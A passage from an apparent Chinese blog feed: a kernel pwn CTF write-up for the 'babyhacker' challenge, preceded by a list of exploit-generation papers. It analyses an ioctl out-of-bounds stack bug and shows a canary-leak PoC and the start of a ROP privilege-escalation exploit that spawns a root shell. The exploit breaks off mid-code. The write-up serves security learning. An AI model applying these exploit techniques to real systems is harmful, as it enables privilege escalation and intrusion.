vulnerabilities. </p><p>Modular synthesis of heap exploits：Windows heap management</p><p> Gollum: Modular and greybox exploit generation for heapoverflows in interpreters</p><p>Towardsautomated generation of exploitation primitives for webbrowsers</p><p>内核：</p><p>Unleash-ing use-before-initialization vulnerabilities in the linuxkernel using targeted stack spraying</p><p>Fuze: Towards facilitating exploitgeneration for kernel use-after-free vulnerabilities.</p><p>Q: Exploit hardening made easy：需要给定任意地址写或者IP劫持基元</p><p>Block oriented programming: Au-tomating data-only attacks</p><p> KEPLER: Facilitating control-flow hijacking primitive eval-uation for linux kernel vulnerabilities</p><p>Heaphopper: Bringing bounded model checking toheap implementation security</p><h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h3&gt;&lt;p&gt;题目：&lt;strong&gt;KOOBE: Towards Facilitating Exploit Generation of Kernel Ou
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>kernel pwn(one)</title>
    <link href="https://j-kangel.github.io/2020/04/16/kernel-pwn-one/"/>
    <id>https://j-kangel.github.io/2020/04/16/kernel-pwn-one/</id>
    <published>2020-04-15T21:52:30.000Z</published>
    <updated>2020-04-16T13:56:55.147Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>是时候学习一下内核pwn了，内核pwn涉及内核以及文件系统的编译，这些类容留到以后再讲，这里先通过几道例题直观感受一下内核pwn。</p><h3 id="babyhacker"><a href="#babyhacker" class="headerlink" title="babyhacker"></a>babyhacker</h3><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>题目附件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  babyhacker tree -L 1       </span><br><span class="line">.</span><br><span class="line">├── babyhacker.ko</span><br><span class="line">├── bzImage</span><br><span class="line">├── initramfs.cpio</span><br><span class="line">├── startvm.sh</span><br></pre></td></tr></table></figure><p>查看启动脚本starvm.sh</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#stty intr ^]</span></span><br><span class="line"><span class="comment">#cd `dirname $0`</span></span><br><span class="line"><span class="comment">#timeout --foreground 15 </span></span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">    -m 512M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -append <span class="string">'console=ttyS0 loglevel=3 oops=panic panic=1 kaslr'</span> \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -s \</span><br><span class="line">    -initrd initramfs.cpio \</span><br><span class="line">    -smp cores=2,threads=4 \</span><br><span class="line">    -cpu qemu64,smep,smap 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p>开启了kaslr、smep、smap，本地调试可以去掉timeout和添加-s</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  babyhacker qemu-system-x86_64 --help |grep gdb</span><br><span class="line">-gdb dev        wait for gdb connection on &apos;dev&apos;</span><br><span class="line">-s              shorthand for -gdb tcp::1234</span><br></pre></td></tr></table></figure><p>提取vmlinux，利用<a href="https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux" target="_blank" rel="noopener">extract-vmlinux</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./extract-vmlinx babyhacker/bzImage &gt; babyhacker/vmlinux</span><br></pre></td></tr></table></figure><p>提取文件系统</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">➜  babyhacker mkdir core </span><br><span class="line">➜  babyhacker cd core</span><br><span class="line">➜  core mv ../initramfs.cpio ./</span><br><span class="line">➜  core cpio -idm &lt; initramfs.cpio</span><br></pre></td></tr></table></figure><p>查看init发现是空的，于是查看/etc/init.d/rcS</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">➜  core bat etc/init.d/rcS                             </span><br><span class="line">───────┬─────────────────────────────────────────────────────────────────────────────</span><br><span class="line">       │ File: etc/init.d/rcS</span><br><span class="line">───────┼─────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   1   │ #!/bin/sh</span><br><span class="line">   2   │ </span><br><span class="line">   3   │ mount -t proc none /proc</span><br><span class="line">   4   │ mount -t devtmpfs none /dev</span><br><span class="line">   5   │ mkdir /dev/pts</span><br><span class="line">   6   │ mount /dev/pts</span><br><span class="line">   7   │ </span><br><span class="line">   8   │ insmod /home/pwn/babyhacker.ko</span><br><span class="line">   9   │ chmod 644 /dev/babyhacker</span><br><span class="line">  10   │ echo 0 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">  11   │ echo 0 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">  12   │ </span><br><span class="line">  13   │ cd /home/pwn</span><br><span class="line">  14   │ chown -R root /flag</span><br><span class="line">  15   │ chmod 400 /flag</span><br><span class="line">  16   │ </span><br><span class="line">  17   │ </span><br><span class="line">  18   │ chown -R 1000:1000 .</span><br><span class="line">  19   │ setsid cttyhack setuidgid 1000 sh</span><br><span class="line">  20   │ </span><br><span class="line">  21   │ umount /proc</span><br><span class="line">  22   │ poweroff -f</span><br><span class="line">───────┴─────────────────────────────────────────────────────────────────────────────</span><br></pre></td></tr></table></figure><p>可以看到添加了内核模块<code>babyhacker.ko</code>，其中<code>dmesg_restrict = 0</code>表示可以直接查看<code>/proc/kallsyms</code>，<code>kptr_restrict=0</code>时，<code>lsmod</code>会直接打印内核地址</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">~ $ lsmod</span><br><span class="line">babyhacker 2104 0 - Live 0xffffffffc0093000 (OE)</span><br><span class="line">~ $ cat /proc/kallsyms |grep commit_creds</span><br><span class="line">ffffffff8e2a1430 T commit_creds</span><br><span class="line">ffffffff8ef73ac0 R __ksymtab_commit_creds</span><br><span class="line">ffffffff8ef939e4 r __kstrtab_commit_creds</span><br><span class="line">~ $ cat /proc/kallsyms |grep prepare_kernel_cred</span><br><span class="line">ffffffff8e2a1820 T prepare_kernel_cred</span><br><span class="line">ffffffff8ef7c5b0 R __ksymtab_prepare_kernel_cred</span><br><span class="line">ffffffff8ef939a8 r __kstrtab_prepare_kernel_cred</span><br></pre></td></tr></table></figure><p>checksec vmlinux，<code>raw_vmlinux_base = 0xffffffff81000000</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">➜  babyhacker checksec vmlinux</span><br><span class="line">[*] &apos;/home/kangel/pwn/kernel/babyhacker/vmlinux&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0xffffffff81000000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>checksec babyhacker.ko，开启了canary</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">➜  babyhacker checksec babyhacker.ko</span><br><span class="line">[*] &apos;/home/kangel/pwn/kernel/babyhacker/babyhacker.ko&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure><p>ida查看babyhacker.ko</p><p>查看fop结构体</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000000000280 fops            file_operations &lt;offset __this_module, 0, 0, 0, 0, 0, 0, 0, \</span><br><span class="line">.data:0000000000000280                                         ; DATA XREF: .data:misc↑o</span><br><span class="line">.data:0000000000000280                                  offset babyhacker_ioctl, 0, 0, 0, 0, 0, 0, 0, 0, 0, \</span><br><span class="line">.data:0000000000000280                                  0, 0, 0, 0, 0, 0, 0, 0, 0&gt;</span><br><span class="line">.data:0000000000000280 _data           ends</span><br></pre></td></tr></table></figure><p>发现只定义了babyhacker_ioctl</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">babyhacker_ioctl</span><span class="params">(file *file, <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> __int64 arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbp</span></span><br><span class="line">  file *rdx1; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">signed</span> __int16 v5; <span class="comment">// di</span></span><br><span class="line">  <span class="keyword">int</span> v4[<span class="number">80</span>]; <span class="comment">// [rsp+0h] [rbp-150h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v8; <span class="comment">// [rsp+140h] [rbp-10h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+148h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  _fentry__(file, cmd, arg);</span><br><span class="line">  v9 = v3;</span><br><span class="line">  v5 = (<span class="keyword">signed</span> __int16)rdx1;</span><br><span class="line">  v8 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">switch</span> ( cmd )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x30001</span>u:</span><br><span class="line">      babyhacker_ioctl_0(rdx1, <span class="number">0x30001</span>u, (<span class="keyword">unsigned</span> __int64)rdx1); <span class="comment">//写入栈</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x30002</span>u:</span><br><span class="line">      copy_to_user(rdx1, v4, buffersize);  <span class="comment">//读出栈</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x30000</span>u:</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)rdx1 &gt;= <span class="number">11</span> )</span><br><span class="line">        v5 = <span class="number">10</span>;</span><br><span class="line">      buffersize = v5;  <span class="comment">//设置size</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>64位传参顺序：rdi、rsi、rdx、rcx、r8、r9，然后是栈。这里的rdx1即ioctl的第三个参数</p><p>可以看到，当rdx1为负数时，<code>buffersize = v5</code>为rdx1的低两字节可以达到<code>0xffff</code>，于是造成了对栈的越界读写，我们可以泄露canary然后rop</p><h4 id="寻找gadget"><a href="#寻找gadget" class="headerlink" title="寻找gadget"></a>寻找gadget</h4><p>首先把vmlinux的gadgets输出到文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  babyhacker ROPgadget --binary ./vmlinux &gt; gadgets</span><br></pre></td></tr></table></figure><p>查找想要的gadget</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  babyhacker cat gadgets |grep &quot;: pop rdx ; ret$&quot;</span><br><span class="line">0xffffffff81083f22 : pop rdx ; ret</span><br></pre></td></tr></table></figure><h4 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h4><p>poc.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">__asm__(<span class="string">"mov user_cs, cs;"</span></span><br><span class="line"><span class="string">"mov user_ss, ss;"</span></span><br><span class="line"><span class="string">"mov user_sp,rsp;"</span></span><br><span class="line"><span class="string">"pushf;"</span></span><br><span class="line"><span class="string">"pop user_rflags;"</span></span><br><span class="line">   );</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"[*]status has been saved."</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_buffersize</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">int</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*]set buffersize to %d\n"</span>,idx);</span><br><span class="line">ioctl(fd, <span class="number">0x30000</span>, idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">baby_read</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*]read to buf."</span>);</span><br><span class="line">ioctl(fd, <span class="number">0x30002</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">baby_write</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*]copy from user."</span>);</span><br><span class="line">ioctl(fd,<span class="number">0x30001</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">save_status();</span><br><span class="line"><span class="keyword">int</span> fd = open(<span class="string">"/dev/babyhacker"</span>,O_RDONLY);  <span class="comment">//注意这里只能读</span></span><br><span class="line"><span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"[*]open /dev/babyhacker error!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">getchar();</span><br><span class="line">set_buffersize(fd, <span class="number">0x80000200</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">0x200</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">baby_read(fd, buf);</span><br><span class="line"><span class="keyword">size_t</span> canary = ((<span class="keyword">size_t</span> *)buf)[<span class="number">40</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+]canary: %p\n"</span>, canary);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后编译打包</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">➜  babyhacker gcc poc.c -static -masm=intel -g -o poc    </span><br><span class="line">poc.c: In function ‘main’:</span><br><span class="line">poc.c:56:9: warning: format ‘%p’ expects argument of type ‘void *’]</span><br><span class="line">  printf(&quot;[+]canary: %p\n&quot;, canary);</span><br><span class="line">         ^</span><br><span class="line">➜  babyhacker mv poc core/home/pwn                                 </span><br><span class="line">➜  babyhacker cd core                             </span><br><span class="line">➜  core find . | cpio -o --format=newc &gt; ../initramfs.cpio</span><br><span class="line">15405 块</span><br></pre></td></tr></table></figure><p>进行调试</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">➜  babyhacker gdb ./vmlinux -q                       </span><br><span class="line">pwndbg: loaded 181 commands. Type pwndbg [filter] for a list.</span><br><span class="line">pwndbg: created $rebase, $ida gdb functions (can be used with prin)</span><br><span class="line">Reading symbols from ./vmlinux...(no debugging symbols found)...do.</span><br><span class="line">pwndbg&gt; add-symbol-file babyhacker.ko 0xffffffffc02ff000           </span><br><span class="line">add symbol table from file &quot;babyhacker.ko&quot; at</span><br><span class="line">        .text_addr = 0xffffffffc0093000</span><br><span class="line">Reading symbols from babyhacker.ko...done.</span><br><span class="line">pwndbg&gt; b *0xffffffffc02ff000+0x50                                 </span><br><span class="line">Breakpoint 1 at 0xffffffffc0093050: file /home/zoe/Desktop/kernel_.</span><br><span class="line">pwndbg&gt; target remote :1234                                        </span><br><span class="line">Remote debugging using :1234</span><br><span class="line">0xffffffff8e263656 in ?? ()</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br></pre></td></tr></table></figure><p>结果如下：</p><p><img alt="" data-src="/2020/04/16/kernel-pwn-one/1.png" class="lazyload"></p><h4 id="exp1-ROP"><a href="#exp1-ROP" class="headerlink" title="exp1(ROP)"></a>exp1(ROP)</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc exp.c -static -masm=intel -g -o exploit</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">spawn_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!getuid())</span><br><span class="line">&#123;</span><br><span class="line">system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"[*]spawn shell error!"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> commit_creds = <span class="number">0xffffffff810a1430</span>;</span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred = <span class="number">0xffffffff810a1820</span>;</span><br><span class="line"><span class="keyword">size_t</span> raw_vmlinux_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">__asm__(<span class="string">"mov user_cs, cs;"</span></span><br><span class="line"><span class="string">"mov user_ss, ss;"</span></span><br><span class="line"><span class="string">"mov user_sp,rsp;"</span></span><br><span class="line"><span class="string">"pushf;"</span></span><br><span class="line"><span class="string">"pop user_rflags;"</span></span><br><span class="line">   );</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"[*]status has been saved."</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_buffersize</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">int</span> idx)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*]set buffersize to %d\n"</span>,idx);</span><br><span class="line">ioctl(fd, <span class="number">0x30000</span>, idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">baby_read</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*]read to buf.\n"</span>);</span><br><span class="line">ioctl(fd, <span class="number">0x30002</span>, buf);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+]read to buf success!\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">baby_write</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[*]copy from user.\n"</span>);</span><br><span class="line">ioctl(fd,<span class="number">0x30001</span>, buf);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"[+]copy from user success!\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">save_status();</span><br><span class="line"><span class="keyword">int</span> fd = open(<span class="string">"/dev/babyhacker"</span>, O_RDONLY);</span><br><span class="line"><span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"[*]open /dev/babyhacker error!"</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">set_buffersize(fd, <span class="number">0x80000200</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">0x200</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">baby_read(fd, 